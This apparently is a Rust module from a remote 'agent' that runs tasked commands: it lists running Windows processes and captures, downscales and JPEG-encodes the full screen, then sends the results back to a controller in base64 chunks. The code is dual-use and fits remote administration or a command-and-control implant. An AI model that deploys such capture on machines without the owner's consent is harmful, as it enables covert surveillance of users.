//! System Operations - process list, screenshot handlers for built-in commands

use crate::protocol::AgentMessage;
use std::sync::mpsc::Sender;

const CHUNK_BYTES: usize = 32768;

fn send_chunked_result(
    sender: &Sender<AgentMessage>,
    task_id: &str,
    output: &str,
    success: bool,
) {
    let bytes = output.as_bytes();
    let total_chunks = ((bytes.len() + CHUNK_BYTES - 1) / CHUNK_BYTES).max(1) as u32;

    for i in 0..total_chunks {
        let start = i as usize * CHUNK_BYTES;
        let end = ((i as usize + 1) * CHUNK_BYTES).min(bytes.len());
        let data = String::from_utf8_lossy(&bytes[start..end]).to_string();
        let is_last = i == total_chunks - 1;

        let _ = sender.send(AgentMessage::TaskResultChunk {
            task_id: task_id.to_string(),
            chunk_index: i,
            total_chunks,
            data,
            is_last,
            success,
        });
    }
}

/// Check if a command is a built-in system operation
pub fn is_sys_op(command: &str) -> bool {
    matches!(command, "ps" | "screenshot")
}

/// Dispatch system operation to the appropriate handler
pub fn handle(task_id: &str, command: &str, sender: &Sender<AgentMessage>) {
    match command {
        "ps" => handle_ps(task_id, sender),
        "screenshot" => handle_screenshot(task_id, sender),
        _ => {
            let _ = sender.send(fail(task_id, format!("unknown sys op: {command}")));
        }
    }
}

/// Handle `ps` command: list running processes
fn handle_ps(task_id: &str, sender: &Sender<AgentMessage>) {
    #[cfg(windows)]
    {
        use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
        use windows_sys::Win32::System::Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
            PROCESSENTRY32W, TH32CS_SNAPPROCESS,
        };

        let mut result = String::new();
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snapshot == INVALID_HANDLE_VALUE {
                let _ = sender.send(fail(task_id, "Failed to create process snapshot".to_string()));
                return;
            }

            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

            if Process32FirstW(snapshot, &mut entry) != 0 {
                loop {
                    let name_end = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
                    let name = String::from_utf16_lossy(&entry.szExeFile[..name_end]);
                    result.push_str(&format!(
                        "\"{}\",{},{}\n",
                        name, entry.th32ProcessID, entry.cntThreads
                    ));
                    if Process32NextW(snapshot, &mut entry) == 0 {
                        break;
                    }
                }
            }

            CloseHandle(snapshot);
        }

        let _ = sender.send(AgentMessage::TaskResult {
            task_id: task_id.to_string(),
            success: true,
            output: result.trim().to_string(),
        });
    }
    #[cfg(not(windows))]
    {
        let _ = sender.send(fail(task_id, "ps not supported on this platform".to_string()));
    }
}

/// Handle `screenshot` command: capture screen
///
/// Uses Win32 GDI to capture the screen and encodes as JPEG (quality 70).
/// Wrapped with a 30-second timeout to prevent GDI calls from blocking
/// the agent indefinitely (e.g. in headless/remote desktop environments).
fn handle_screenshot(task_id: &str, sender: &Sender<AgentMessage>) {
    #[cfg(windows)]
    {
        use std::sync::mpsc;
        use std::time::Duration;

        let (tx, rx) = mpsc::channel();
        let tid = task_id.to_string();

        // Run GDI capture in a dedicated thread with timeout
        std::thread::spawn(move || {
            let result = std::panic::catch_unwind(|| unsafe { capture_screen_to_jpeg() });
            let _ = tx.send(match result {
                Ok(inner) => inner,
                Err(_) => Err("screenshot panicked (GDI call failed)".to_string()),
            });
        });

        match rx.recv_timeout(Duration::from_secs(30)) {
            Ok(Ok(jpg_data)) => {
                use base64::{engine::general_purpose::STANDARD, Engine as _};
                let b64 = STANDARD.encode(&jpg_data);
                send_chunked_result(sender, &tid, &b64, true);
            }
            Ok(Err(e)) => {
                send_chunked_result(sender, &tid, &format!("screenshot failed: {e}"), false);
            }
            Err(_timeout) => {
                send_chunked_result(sender, &tid, "screenshot timed out after 30s", false);
            }
        }
    }
    #[cfg(not(windows))]
    {
        send_chunked_result(sender, task_id, "screenshot not supported on this platform", false);
    }
}

/// Maximum screenshot dimension (width or height). Larger screens are
/// downscaled with Lanczos3. JPEG quality 70 keeps output ~100-200 KB
/// for a 1280px-wide screenshot.
#[cfg(windows)]
const SCREENSHOT_MAX_DIM: i32 = 1280;

#[cfg(windows)]
unsafe fn capture_screen_to_jpeg() -> Result<Vec<u8>, String> {
    use image::{codecs::jpeg::JpegEncoder, imageops, imageops::FilterType, DynamicImage, RgbaImage};
    use windows_sys::Win32::Graphics::Gdi::*;
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        GetSystemMetrics, SetProcessDPIAware, SM_CXSCREEN, SM_CYSCREEN,
    };

    SetProcessDPIAware();

    let width = GetSystemMetrics(SM_CXSCREEN);
    let height = GetSystemMetrics(SM_CYSCREEN);
    if width <= 0 || height <= 0 {
        return Err("Invalid screen dimensions".to_string());
    }

    // ── GDI capture → BGRA buffer ──
    let hdc_screen = GetDC(std::ptr::null_mut());
    if hdc_screen.is_null() {
        return Err("GetDC failed: no desktop session available".to_string());
    }
    let hdc_mem = CreateCompatibleDC(hdc_screen);
    if hdc_mem.is_null() {
        ReleaseDC(std::ptr::null_mut(), hdc_screen);
        return Err("CreateCompatibleDC failed".to_string());
    }
    let hbitmap = CreateCompatibleBitmap(hdc_screen, width, height);
    if hbitmap.is_null() {
        DeleteDC(hdc_mem);
        ReleaseDC(std::ptr::null_mut(), hdc_screen);
        return Err("CreateCompatibleBitmap failed".to_string());
    }
    let old_bmp = SelectObject(hdc_mem, hbitmap as *mut _);

    let copied = BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);
    if copied == 0 {
        SelectObject(hdc_mem, old_bmp);
        DeleteObject(hbitmap as *mut _);
        DeleteDC(hdc_mem);
        ReleaseDC(std::ptr::null_mut(), hdc_screen);
        return Err("BitBlt failed".to_string());
    }

    let mut bmi: BITMAPINFO = std::mem::zeroed();
    bmi.bmiHeader.biSize = std::mem::size_of::<BITMAPINFOHEADER>() as u32;
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height; // top-down
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    let row_size = (width * 4) as usize;
    let buf_size = row_size * height as usize;
    let mut pixels: Vec<u8> = vec![0u8; buf_size];

    let dib_result = GetDIBits(
        hdc_mem, hbitmap, 0, height as u32,
        pixels.as_mut_ptr() as *mut _,
        &mut bmi, DIB_RGB_COLORS,
    );

    SelectObject(hdc_mem, old_bmp);
    DeleteObject(hbitmap as *mut _);
    DeleteDC(hdc_mem);
    ReleaseDC(std::ptr::null_mut(), hdc_screen);

    if dib_result == 0 {
        return Err("GetDIBits failed".to_string());
    }

    // ── BGRA → RGBA conversion ──
    let mut rgba = pixels;
    for chunk in rgba.chunks_exact_mut(4) {
        chunk.swap(0, 2);
    }

    // ── Build image + resize ──
    let img = RgbaImage::from_raw(width as u32, height as u32, rgba)
        .ok_or("failed to create image buffer")?;
    let img = DynamicImage::ImageRgba8(img);

    let img = if width > SCREENSHOT_MAX_DIM || height > SCREENSHOT_MAX_DIM {
        let scale = (SCREENSHOT_MAX_DIM as f64 / width as f64)
            .min(SCREENSHOT_MAX_DIM as f64 / height as f64);
        let new_w = ((width as f64 * scale) as u32).max(1);
        let new_h = ((height as f64 * scale) as u32).max(1);
        DynamicImage::ImageRgba8(imageops::resize(&img, new_w, new_h, FilterType::Lanczos3))
    } else {
        img
    };

    // ── JPEG encode (quality 70 — good clarity at ~10x smaller than PNG) ──
    let mut jpg = Vec::new();
    let rgba = img.to_rgba8();
    let mut encoder = JpegEncoder::new_with_quality(&mut jpg, 70);
    encoder
        .encode(&rgba, rgba.width(), rgba.height(), image::ExtendedColorType::Rgba8)
        .map_err(|e| format!("JPEG encode failed: {e}"))?;

    Ok(jpg)
}

fn fail(task_id: &str, detail: String) -> AgentMessage {
    AgentMessage::TaskResult {
        task_id: task_id.to_string(),
        success: false,
        output: detail,
    }
}
